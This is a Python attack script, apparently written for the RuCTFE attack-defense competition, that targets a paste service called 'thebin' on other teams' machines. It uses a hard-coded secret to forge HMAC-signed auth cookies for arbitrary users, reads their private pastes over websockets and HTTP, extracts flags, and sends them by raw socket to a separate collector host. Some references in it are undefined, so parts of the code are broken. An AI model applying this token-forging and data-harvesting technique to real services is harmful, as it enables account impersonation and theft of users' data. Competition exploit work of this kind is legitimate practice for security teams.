#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# author: bluec0re
import requests
import random
import sys
import re
import hmac
import json
import base64
import hashlib
import asyncio
import websockets
import json
from urllib.parse import quote
import socket

FLAG_RE = re.compile(r'(\w{31}=)')

USER_AGENTS = ['Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
               'Mozilla/5.0 (X11; Linux i686; rv:30.0) Gecko/20100101 Firefox/30.0',
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
               'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.39 (KHTML, like Gecko) Version/9.0 Safari/601.1.39']

SECRET = b'a9ef8b93ee63cc8bb105db9a9e5281fff316889870c561c3b3289cd16bb0d4d7e36484229ce272c367aab2e71d6d427065e2b483f4c2e22efb579b71d0f1288e  -'
# SECRET = b'a9ef8b93ee63cc8bb105db9a9e5281fff316889870c561c3b3289cd16bb0d4d7e36484229ce272c367aab2e71d6d427065e2b483f4c2e22efb579b71d0f1ffff  -'


def sign(data):
    if not isinstance(data, str):
        data = json.dumps(data)
    s = base64.b64encode(data.encode())
    hm = hmac.new(SECRET, msg=s, digestmod=hashlib.sha1).digest()
    return quote('{}\n--{}'.format(s.decode(), base64.b64encode(hm).decode()).encode())


class Client(requests.Session):
    def __init__(self, ip, team):
        super(Client, self).__init__()
        target = 'thebin.team{}.ructfe.org'.format(team)
        print('IP', ip, 'TARGET', target)
        self.headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Host': target
        }
        #websockets.http.USER_AGENT = self.headers.pop('User-Agent')
        self.target = 'ws://{}'.format(ip)
        self.http_target = 'http://{}'.format(ip)
        self.fixed = False

    def start(self):
        asyncio.get_event_loop().run_until_complete(self.public())

    async def handler(self, websocket, consumer, cookies):
        while True:
            message = await websocket.recv()
            print('Got Message', message)
            await consumer(message, cookies)

    async def public(self):
        await self.connect('/publics', self.do_public)

    async def my(self, owner):
        try:
            await self.connect('/my', self.do_my, {
                'auth': sign({
                    'user': owner
                }),
                'name': owner
            })
        except Exception as e:
            print('Error during my connect', str(e))
            self.fixed = True

    async def connect(self, path, consumer, cookies=None):
        headers = self.headers
        if cookies:
            cookie = []
            for k, v in cookies.items():
                cookie.append('{}={}'.format(k, v))
            headers['Cookie'] = '; '.join(cookie)
            # print(cookies, headers['Cookie'])

        async with websockets.connect(self.target + path, extra_headers=headers) as websocket:
            print('Connected', path)
            await self.handler(websocket, consumer, cookies)

    async def do_public(self, message, cookies):
        msg = json.loads(message)
        owner = msg['owner']
        path = msg['url']

        print('Found owner', owner)
        target = self.http_target + path

        if not self.fixed:
            asyncio.get_event_loop().create_task(self.my(owner))
        print("Requesting", target, "for", owner)
        self.get_flag(target, cookies)

    async def do_my(self, message, cookies):
        msg = json.loads(message)
        owner = msg['owner']
        path = msg['url']
        target = self.http_target + path
        print("Requesting", target, "for", owner)
        self.get_flag(target, cookies)

    def get_flag(self, target, cookies=None):
        resp = self.get(target, cookies=cookies)
        try:
            body = resp.json()['body']
        except:
            print('No Json?', resp.text)
            return

        m = FLAG_RE.search(body)
        if m:
            flag = m.group(1)
            print('Got Flag for', owner, ':', flag)
            s = socket.create_connection(('10.60.53.254', 8081))
            s.sendall('thebin|{}|{}\n'.format(self.ip, flag).encode())
            s.close()


def main():
    ip, port, team = sys.argv[1:]
    client = Client(ip, team)
    client.start()


if __name__ == '__main__':
    main()
